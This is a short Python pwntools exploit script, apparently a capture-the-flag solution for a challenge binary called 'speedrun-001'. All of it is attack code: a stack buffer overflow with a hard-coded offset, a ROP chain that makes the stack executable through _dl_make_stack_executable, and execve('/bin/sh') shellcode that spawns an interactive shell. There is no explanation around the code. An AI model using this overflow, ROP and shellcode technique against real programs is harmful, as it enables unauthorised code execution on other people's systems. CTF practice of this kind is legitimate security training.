from pwn import *
s = process('./speedrun-001')
raw_input('debug')

dl_exe_addr = 0x000000000047FD40
main_adrr = 0x0000000000400BC1
input_func = 0x0000000000400B60
read_func = 0x0000000000400B8B
# rax = 0x0x7fffffffe020
# rbp_8 = 0x0x7fffffffe428
libc_stack_end = 0x00000000006B8AB0
prot_stack = 0x00000000006B8EF0

pop_rax = 0x0000000000415664 
mov_rax_rdx_pop_ebx_ret = 0x0000000000484ec0 
pop_rdx_ret = 0x00000000004498b5
pop_rdi_ret = 0x0000000000400686
push_rsp_ret = 0x0000000000450ae4  

offset = 0x408
shellcode = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
shellcode2 = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

# shellcode 24 bytes
payload = (offset)*'a'

payload += p64(pop_rax)
payload += p64(prot_stack)
payload += p64(pop_rdx_ret)
payload += p64(7)  # rdx = 7
payload += p64(mov_rax_rdx_pop_ebx_ret)
payload += p64(1)  #ebx = 7

payload += p64(pop_rdi_ret)
payload += p64(libc_stack_end)
payload += p64(dl_exe_addr)
payload += p64(push_rsp_ret)
payload += shellcode2

s.sendline(payload)

s.interactive()